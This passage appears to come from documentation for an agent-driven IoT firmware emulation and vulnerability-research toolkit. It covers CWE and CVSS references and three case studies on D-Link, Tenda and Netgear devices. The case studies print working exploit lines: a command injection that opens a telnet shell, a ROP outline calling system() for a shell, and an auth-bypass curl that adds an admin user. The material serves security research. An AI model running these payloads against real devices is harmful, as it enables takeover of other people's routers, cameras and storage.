| Authentication Bypass | CWE-287 | Improper authentication |
| Missing Authentication | CWE-306 | Missing authentication for critical function |
| Hardcoded Credentials | CWE-798 | Hardcoded passwords/keys |
| Use of Hardcoded Password | CWE-259 | Hardcoded password in binary or config |
| Information Exposure | CWE-200 | Sensitive information in responses or binaries |
| Integer Overflow | CWE-190 | Integer overflow/wraparound |
| Format String | CWE-134 | Uncontrolled format string |
| Use After Free | CWE-416 | Use after free in memory management |
| NULL Pointer Dereference | CWE-476 | NULL pointer dereference |
| Race Condition | CWE-362 | TOCTOU or other race conditions |
| Insecure Random | CWE-330 | Insufficient entropy or predictable PRNG |
| Weak Cryptography | CWE-327 | Broken or weak cryptographic algorithms |
| Certificate Validation | CWE-295 | Improper certificate validation |
| Cross-Site Request Forgery | CWE-352 | CSRF in management interface |
| Server-Side Request Forgery | CWE-918 | SSRF via URL parameters |

### Step 5.3: CVSS Scoring Guide

Use [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1).

**IoT firmware common scoring patterns:**

**Pattern 1: Remote Code Execution (RCE) via Command Injection**
```
AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H -> CVSS 10.0 (Critical)
AV: Attack Vector = Network (N) - exploitable over network
AC: Attack Complexity = Low (L) - no special conditions needed
PR: Privileges Required = None (N) - no authentication needed
UI: User Interaction = None (N) - no user trickery needed
S:  Scope = Changed (C) - impacts beyond vulnerable component
C:  Confidentiality = High (H) - full data access
I:  Integrity = High (H) - can modify system
A:  Availability = High (H) - can crash/DoS
```

**Pattern 2: Authenticated Command Injection**
```
AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H -> CVSS 9.9 (Critical)
PR: Privileges Required = Low (L) - requires login
```

**Pattern 3: Buffer Overflow with Mitigations**
```
AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H -> CVSS 8.1 (High)
AC: Attack Complexity = High (H) - requires bypassing ASLR/canary
S:  Scope = Unchanged (U) - impacts only vulnerable component
```

**Pattern 4: Information Disclosure**
```
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N -> CVSS 7.5 (High)
```

**Pattern 5: Authenticated Stored XSS**
```
AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N -> CVSS 5.4 (Medium)
```

**Quick CVSS reference table for common IoT findings:**

| Vulnerability | AV | AC | PR | UI | S | C | I | A | Score |
|--------------|----|----|----|----|---|---|---|---|-------|
| Pre-auth RCE | N | L | N | N | C | H | H | H | 10.0 |
| Pre-auth command injection | N | L | N | N | C | H | H | H | 10.0 |
| Post-auth command injection | N | L | L | N | C | H | H | H | 9.9 |
| Stack overflow (modern hardening) | N | H | N | N | U | H | H | H | 8.1 |
| Auth bypass | N | L | N | N | C | H | H | H | 10.0 |
| Hardcoded root password | N | L | N | N | C | H | H | H | 10.0 |
| Source code disclosure | N | L | N | N | U | H | N | N | 7.5 |
| Reflected XSS | N | L | N | R | C | L | L | N | 6.1 |
| Stored XSS (authenticated) | N | L | L | R | C | L | L | N | 5.4 |
| Denial of Service | N | L | N | N | U | N | N | H | 7.5 |

---

## Case Studies

### Case 1: Command Injection in D-Link Router httpd

**Scenario:** A D-Link DIR-882 router running firmware version 1.20.

**Discovery process:**

1. **Reconnaissance:** Identified httpd binary runs on MIPSEL, uses GoAhead webserver.
2. **Extraction:** binwalk successfully extracted squashfs root filesystem.
3. **Emulation:** Uploaded rootfs to Emulation Agent, configured NVRAM, started httpd on port 8080.
4. **Static analysis (Ghidra):** Found `sprintf()` + `system()` pattern in `handle_ping_test()` function at 0x00401A30.
5. **Dynamic verification:** Sent crafted request, observed strace output showing shell command execution.
6. **Exploitation:** Built a reverse shell payload using netcat available in the firmware.

**Affected code pattern (from Ghidra decompilation):**

```c
void handle_ping_test(char *target_ip) {
    char cmd[256];
    // VULNERABLE: target_ip from HTTP parameter without sanitization
    sprintf(cmd, "ping -c 4 %s > /tmp/ping_result", target_ip);
    system(cmd);
    // Read back /tmp/ping_result and display to user
}
```

**Exploit:**

```bash
curl "http://127.0.0.1:8080/goform/ping_test?target=127.0.0.1;telnetd -p 9999 -l /bin/sh"
telnet 127.0.0.1 9999
```

**CVSS:** 10.0 (Critical) - CWE-78, pre-auth, network-exploitable, no user interaction.

**Lessons:**
- Always check for `system()` and `popen()` calls with user-controlled format strings.
- GoAhead's `goform/` endpoints often bypass normal web authentication.
- NVRAM configuration was essential to get httpd to start.

---

### Case 2: Buffer Overflow in Tenda WiFi Camera telnetd

**Scenario:** A Tenda CP3 WiFi camera running firmware version 2.1.3.

**Discovery process:**

1. **Reconnaissance:** Identified custom telnetd daemon (`/usr/sbin/telnetd_start`).
2. **Extraction:** Firmware used a custom squashfs with modified header; binwalk failed. Manual extraction at offset 0x120000 succeeded.
3. **Emulation:** Started telnetd on port 2323. Note: telnetd required setting HOME env var.
4. **Fuzzing:** Used mutation-based fuzzer targeting the telnet login prompt. After 15,000 mutations, triggered SIGSEGV.
5. **Crash analysis:** Stack buffer overflow in password processing. 128-byte stack buffer, no bounds check on `strcpy()` from input buffer (up to 1024 bytes).
6. **Exploitation:** No stack canary, no PIE. Simple ROP chain calling `system("/bin/sh")`.

**Affected code pattern:**

```c
int check_password(char *input_password) {
    char stored_password[64];
    char input_copy[128];
    // Read stored password from NVRAM
    nvram_get("telnet_password", stored_password, 64);
    // VULNERABLE: strcpy into 128-byte buffer from unbounded input
    strcpy(input_copy, input_password);
    return strcmp(input_copy, stored_password);
}
```

**Exploit strategy:**
1. 128 + 4 (saved FP) = 132 bytes padding to reach saved RA.
2. First gadget: `lw $ra, offset($sp); jr $ra` -- stack pivot.
3. Second gadget: `lw $a0, 0x18($sp)` -- load command string addr into $a0.
4. Jump to `system()` in libc.
5. Command string: `telnetd -p 4444 -l /bin/sh` placed after the ROP chain.

**CVSS:** 9.8 (Critical) - CWE-121, pre-auth, network-exploitable, no user interaction (only difference from 10.0 is because of slight exploit complexity due to ASLR).

**Lessons:**
- Custom telnetd implementations are a gold mine for buffer overflows.
- No stack canary or PIE is extremely common in embedded Linux binaries.
- The QEMU strace feature was invaluable for verifying the crash was reproducible.

---

### Case 3: Auth Bypass in Netgear NAS Web Interface

**Scenario:** A Netgear ReadyNAS device running firmware version 6.10.3.

**Discovery process:**

1. **Reconnaissance:** Identified web interface is a custom CGI-based application written in C.
2. **Extraction:** Successfully extracted with binwalk. Rootfs was a standard ext4 image inside the firmware.
3. **Emulation:** Started the custom web server binary (`/usr/sbin/frontview`).
4. **Web analysis:** Mapped all CGI endpoints via directory brute-forcing. Found `/cgi-bin/admin/debug.cgi`.
5. **Source analysis:** Decompiled `debug.cgi` in Ghidra. Found that the authentication check could be bypassed by providing a specific `X-Debug-Token` header set to the string "debug_mode_enabled".
6. **Verification:** Sent request with the bypass header and accessed admin functionality without credentials.

**Affected code pattern:**

```c
int handle_debug_request(struct http_request *req) {
    char *auth_token = http_get_header(req, "X-Debug-Token");
    char *session_id = http_get_cookie(req, "session_id");

    // VULNERABLE: debug token bypasses normal auth
    if (auth_token && strcmp(auth_token, "debug_mode_enabled") == 0) {
        // Grant admin access without checking session_id
        return handle_admin_action(req);
    }

    // Normal auth path
    if (session_id && validate_session(session_id)) {
        return handle_admin_action(req);
    }

    return send_401_unauthorized();
}
```

**Exploit:**

```bash
curl -H "X-Debug-Token: debug_mode_enabled" \
     "http://127.0.0.1:8080/cgi-bin/admin/debug.cgi?action=add_user&username=hacker&password=hacker&role=admin"
```

**CVSS:** 9.8 (Critical) - CWE-306, no authentication required with debug token.

**Lessons:**
- Debug and development endpoints are frequently left in production firmware.
- Checking all HTTP header handling in CGI binaries is essential.
- Strings like "debug", "test", "backdoor", "override" in the binary are worth investigating.

---

## Integration with Claude Code Agents

The Emulation Agent integrates with Claude Code's agent system for automated vulnerability research.

### Agent Architecture

```
┌────────────────────────────────────────────────────────────────┐
│                     Claude Code Agent System                    │
│                                                                │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │              firmware-emulator agent                      │ │
│  │                                                          │ │
│  │  Capabilities:                                           │ │
│  │  - Upload firmware to Emulation Agent                    │ │
│  │  - Extract rootfs and detect architecture                │ │
│  │  - Start/stop emulated services                          │ │
│  │  - Probe services and verify they are running            │ │
│  │  - Execute commands in emulated environment              │ │
│  │  - Debug service crashes and diagnose issues             │ │
│  └──────────────────────────────────────────────────────────┘ │
│                              │                                  │
│                              v                                  │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │           firmware-vuln-researcher agent                  │ │
│  │                                                          │ │
│  │  Capabilities:                                           │ │
│  │  - Analyze emulated binaries for vulnerabilities         │ │
│  │  - Run fuzzing campaigns against emulated services       │ │
│  │  - Perform static analysis with Ghidra/IDA               │ │
│  │  - Triage crashes and determine exploitability           │ │
│  │  - Generate vulnerability reports with CVSS scoring      │ │
│  └──────────────────────────────────────────────────────────┘ │
│                              │                                  │
│                              v                                  │
│  ┌──────────────────────────────────────────────────────────┐ │
│  │             emulate-and-analyze workflow                  │ │
│  │                                                          │ │
│  │  Orchestrated pipeline:                                  │ │
│  │  1. firmware-emulator: Extract and emulate               │ │
│  │  2. firmware-emulator: Verify services running           │ │
│  │  3. firmware-vuln-researcher: Static analysis            │ │
│  │  4. firmware-vuln-researcher: Dynamic fuzzing            │ │
│  │  5. firmware-vuln-researcher: Report generation          │ │
│  │  6. Human review of findings                             │ │
│  └──────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────┘
```

### Using the firmware-emulator Agent

The `firmware-emulator` agent definition is at `agents/firmware-emulator.md`. Its primary tools are the Emulation Agent API endpoints.

**Example task for firmware-emulator:**

```
Task: Emulate the D-Link DIR-882 httpd service from firmware DIR-882_FW120.bin

1. Extract firmware: binwalk -e DIR-882_FW120.bin
2. Upload rootfs to emulation agent: curl -X POST .../api/upload_rootfs -F "file=@squashfs-root.tar.gz"
3. Configure NVRAM: curl -X POST .../api/nvram_config ...
4. Start httpd: curl -X POST .../api/start_service ...
5. Probe service: curl -X POST .../api/probe ...
6. Return service_id and access URL
```

### Using the firmware-vuln-researcher Agent

The `firmware-vuln-researcher` agent definition is at `agents/firmware-vuln-researcher.md`. It takes an emulated service and performs vulnerability analysis.

**Example task for firmware-vuln-researcher:**

```
Task: Analyze the emulated D-Link httpd service for vulnerabilities

1. Get service info: curl .../api/service/svc-001
2. Run hardening check: /api/exec command="checksec /usr/sbin/httpd"
3. Find dangerous functions: Use Ghidra headless to analyze binary
4. Run web fuzzer: Execute grammar-based HTTP fuzzer against the service
5. Check for common IoT vulnerabilities:
   - Command injection in CGI parameters
   - Auth bypass in goform endpoints
   - Path traversal in file serving
6. Report findings with CWE and CVSS
```

### Running the emulate-and-analyze Workflow

The `emulate-and-analyze` workflow is a combined agent at `agents/emulate-and-analyze.md` that orchestrates the full pipeline.

```bash
# Invoke via Claude Code
# The workflow agent will:
# 1. Set up the emulation environment
# 2. Extract and emulate all services found
# 3. Run automated vulnerability checks
# 4. Generate a combined vulnerability report

# Example invocation:
python -m vulnagent.cli --target DIR-882_FW120.bin --emulation-mode agent

# This triggers:
# - Firmware upload to Emulation Agent
# - Architecture detection
# - Service startup
# - Automated vulnerability scanning
# - Report generation (vuln_report.json)
```

**Expected output structure:**

```json
{
  "target": "DIR-882_FW120.bin",
  "analysis_date": "2026-07-02T10:30:00Z",
  "firmware_info": {
    "vendor": "D-Link",
    "model": "DIR-882",
    "version": "1.20",
    "architecture": "mipsel"
  },
  "emulation_results": {
    "services_started": ["httpd:8080", "telnetd:2323"],
    "services_failed": ["upnpd"]
  },
  "findings": [
    {
      "severity": "critical",
      "cwe": "CWE-78",
      "component": "httpd",
      "function": "handle_ping_test",
      "type": "command_injection",
      "cvss": 10.0,
      "description": "Pre-auth OS command injection in ping test handler",
      "poc": "curl 'http://.../goform/ping_test?target=;id'"
    }
  ],
  "statistics": {
    "binaries_analyzed": 12,
    "endpoints_fuzzed": 45,
    "crashes_observed": 3,
    "vulnerabilities_found": 1
  }
}
```

---

## Additional Resources

### Reference Materials

- [OWASP IoT Security Verification Standard](https://owasp.org/www-project-iot-security-verification-standard/)
- [FIRST CVSS v3.1 Specification](https://www.first.org/cvss/v3-1/)
- [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/)
- [IoT Firmware Analysis Guide by OWASP](https://wiki.owasp.org/index.php/IoT_Firmware_Analysis)
- [QEMU User Mode Emulation Documentation](https://www.qemu.org/docs/master/user/index.html)

### Tools Reference

| Tool | URL | Purpose |
|------|-----|---------|
| binwalk | https://github.com/ReFirmLabs/binwalk | Firmware extraction and analysis |
| Ghidra | https://ghidra-sre.org/ | Software reverse engineering |
| GDB with multiarch | `sudo apt install gdb-multiarch` | Cross-architecture debugging |
| ROPgadget | https://github.com/JonathanSalwan/ROPgadget | ROP gadget finder |
| pwntools | https://github.com/Gallopsled/pwntools | CTF and exploit development toolkit |
| checksec | https://github.com/slimm609/checksec.sh | Binary hardening checker |
| AFL++ | https://github.com/AFLplusplus/AFLplusplus | Fuzzing framework |
| boofuzz | https://github.com/jtpereyda/boofuzz | Network protocol fuzzing |
| Burp Suite Community | https://portswigger.net/burp/communitydownload | Web application testing |
| Wireshark | https://www.wireshark.org/ | Network traffic analysis |
| firmware-mod-kit | https://github.com/rampageX/firmware-mod-kit | Firmware modification toolkit |
